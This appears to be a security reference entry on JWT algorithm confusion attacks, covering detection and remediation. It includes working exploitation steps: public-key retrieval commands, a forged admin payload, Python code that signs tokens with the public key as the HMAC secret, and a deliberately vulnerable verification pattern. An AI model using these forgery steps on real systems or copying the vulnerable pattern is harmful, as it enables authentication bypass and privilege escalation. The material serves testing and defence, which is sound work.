# JWT Algorithm Confusion Attacks

## Attack Description

Algorithm confusion attacks (also known as key confusion attacks) exploit flawed JWT library implementations that allow attackers to force servers to verify JWT signatures using a different algorithm than intended. This enables forging valid JWTs containing arbitrary values without knowing the server's secret signing key.

The attack exploits the difference between **symmetric** (HMAC) and **asymmetric** (RSA) algorithms:
- **Symmetric (HS256)**: Uses a single secret key for both signing and verification
- **Asymmetric (RS256)**: Uses a private key for signing, public key for verification

When libraries use algorithm-agnostic verification methods that rely on the `alg` header parameter, attackers can force asymmetric verification to use symmetric algorithms, treating the public key as an HMAC secret.

## Prerequisites

- Target application using asymmetric JWT signing (RS256, ES256, etc.)
- Access to the server's public key (often publicly exposed)
- JWT library vulnerable to algorithm confusion
- Valid JWT token to modify

## Exploitation Steps

### 1. Obtain the Server's Public Key

**Method A: Standard JWKS endpoints**
```bash
# Check common JWKS locations
curl https://target.com/.well-known/jwks.json
curl https://target.com/jwks.json
curl https://target.com/.well-known/openid_configuration

# Example JWKS response:
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB", 
      "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
      "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
    }
  ]
}
```

**Method B: Extract from application**
```bash
# Look for public keys in:
# - JavaScript source code
# - Mobile app binaries  
# - API documentation
# - SSL certificates

# Extract from certificate
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem
```

**Method C: Derive from existing tokens**
```bash
# Use jwt_forgery.py with two valid JWTs
docker run --rm -it portswigger/sig2n <token1> <token2>
```

### 2. Convert Public Key to Suitable Format

The attack requires the exact same format as the server's local copy. Most commonly X.509 PEM format:

**Using Burp JWT Editor:**
1. Load JWK in JWT Editor Keys tab
2. Select PEM radio button and copy
3. Base64-encode the PEM in Decoder tab
4. Create new Symmetric Key in JWT Editor
5. Replace the `k` parameter with Base64-encoded PEM

**Manual conversion:**
```bash
# JWK to PEM conversion (if needed)
# Use online tools or JWT libraries

# Ensure format matches exactly:
# - Same encoding (X.509 vs PKCS1)
# - Same line breaks and whitespace
# - Same headers/footers
```

### 3. Modify JWT Payload

```bash
# Decode current JWT
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"RS256","typ":"JWT"}

# Create new header with HS256
echo '{"alg":"HS256","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '='

# Modify payload as desired
echo '{"user":"admin","role":"admin","exp":1699999999}' | base64 -w 0 | tr '+/' '-_' | tr -d '='
```

### 4. Sign JWT with Public Key as HMAC Secret

```python
import jwt
import base64

# Load public key (must match server's exact format)
with open('public.pem', 'r') as f:
    public_key = f.read()

# Create payload
payload = {
    "user": "admin", 
    "role": "admin",
    "exp": 1699999999
}

# Sign using HS256 with public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

## Detection Methods

### Manual Testing
```bash
# 1. Identify JWT algorithm in use
echo "<jwt_token>" | cut -d. -f1 | base64 -d
# Look for "alg":"RS256" or similar asymmetric algorithms

# 2. Attempt to obtain public key
curl https://target.com/.well-known/jwks.json

# 3. Test algorithm confusion
# Use JWT_tool or manual modification
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```

### Automated Testing
```bash
# JWT_tool algorithm confusion test
git clone https://github.com/ticarpi/jwt_tool.git
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem

# Test with different key formats
python3 jwt_tool.py <JWT_TOKEN> -S hs256 -k public.pem

# Verify public key matches
python3 jwt_tool.py <JWT_TOKEN> -V -pk public.pem
```

### Burp Suite Extensions
- **JWT Editor**: Built-in algorithm confusion testing
- **JOSEPH**: Automated JWT vulnerability testing  
- **JWT Tool**: Manual and automated testing capabilities

## Remediation

### Secure Library Usage
```python
# Python - Explicit algorithm specification
import jwt

def verify_token(token, public_key):
    try:
        # NEVER allow algorithm to be specified in token header
        # Always explicitly specify expected algorithm
        payload = jwt.decode(
            token, 
            public_key, 
            algorithms=['RS256']  # Only allow expected algorithm
        )
        return payload
    except jwt.InvalidTokenError:
        return None

# Additional validation
def secure_verify(token, public_key, expected_algorithm='RS256'):
    # Decode header without verification first
    header = jwt.get_unverified_header(token)
    
    # Verify algorithm matches expectation
    if header.get('alg') != expected_algorithm:
        raise ValueError(f"Unexpected algorithm: {header.get('alg')}")
    
    # Then verify with explicit algorithm
    return jwt.decode(token, public_key, algorithms=[expected_algorithm])
```

### Library-Level Prevention
```javascript
// Node.js - Secure verification
const jwt = require('jsonwebtoken');

function verifyToken(token, publicKey) {
    // Explicitly specify algorithm - don't trust token header
    return jwt.verify(token, publicKey, { 
        algorithms: ['RS256']  // Only RS256 allowed
    });
}

// Additional header validation
function secureVerify(token, publicKey) {
    const decoded = jwt.decode(token, { complete: true });
    
    // Validate algorithm before verification
    if (decoded.header.alg !== 'RS256') {
        throw new Error('Invalid algorithm');
    }
    
    return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
}
```

### Infrastructure Controls
1. **Algorithm allowlisting**: Never accept algorithms from token header
2. **Key format validation**: Ensure consistent key formats across environments
3. **Algorithm-specific verification**: Use separate methods for asymmetric vs symmetric
4. **Header validation**: Validate all header parameters before processing

## Real Examples

### Example 1: CVE-2016-5431 (PHP JOSE Library)
- **Vulnerability**: Algorithm substitution in JWS component
- **Affected**: Gree Inc. JOSE Library before v2.2.1
- **Impact**: Signature bypass using public key as HMAC secret

### Example 2: CVE-2016-10555 (nodejs-jwt-simple)
- **Vulnerability**: Algorithm confusion in JWT verification
- **Affected**: nodejs-jwt-simple < 0.5.3
- **Impact**: Authentication bypass via algorithm switching

### Example 3: PortSwigger Academy Labs
- **Scenario**: RS256 to HS256 confusion
- **Public key**: Available at `/.well-known/jwks.json`
- **Exploitation**: Changed algorithm, signed with public key
- **Impact**: Admin access via forged JWT

### Example 4: Real-world Bug Bounty
- **Target**: E-commerce platform using JWT for session management
- **Discovery**: Public key exposed in mobile app bundle
- **Exploitation**: Algorithm confusion for admin privilege escalation
- **Bounty**: $2,500 for critical authentication bypass

## Tool References

```bash
# JWT_tool (comprehensive)
python3 jwt_tool.py <TOKEN> -X k -pk public.pem

# RSA key derivation from tokens
docker run --rm -it portswigger/sig2n <token1> <token2>

# Manual testing with Python
import jwt
token = jwt.encode(payload, public_key, algorithm='HS256')

# Burp Extensions
# - JWT Editor
# - JOSEPH 
# - JSON Web Tokens
```

## Technical Deep Dive

### Vulnerable Code Pattern
```python
# VULNERABLE - Algorithm from token header
def verify(token, secret_or_public_key):
    header = decode_header(token)
    algorithm = header['alg']  # User-controlled!
    
    if algorithm == "RS256":
        # Use provided key as RSA public key
        return verify_rsa(token, secret_or_public_key)
    elif algorithm == "HS256":  
        # Use provided key as HMAC secret key - DANGEROUS!
        return verify_hmac(token, secret_or_public_key)
```

### Attack Flow
1. **Normal RS256**: `verify(token, public_key)` with `alg: "RS256"`
2. **Attack**: Change `alg` to `"HS256"` in token header  
3. **Result**: `verify_hmac(token, public_key)` - public key used as HMAC secret
4. **Exploitation**: Attacker signs new token with `HMAC-SHA256(payload, public_key)`

### Key Format Requirements
The public key must be **byte-for-byte identical** to the server's version:
```bash
# Different formats may not match:
# X.509 PEM vs PKCS1 PEM
# Different line breaks
# Missing/extra whitespace
# Different headers (BEGIN RSA PUBLIC KEY vs BEGIN PUBLIC KEY)
```

## OWASP References
- **OWASP Top 10 2021**: A02 Cryptographic Failures
- **OWASP ASVS**: V3.2 Session Management  
- **CWE-327**: Use of a Broken or Risky Cryptographic Algorithm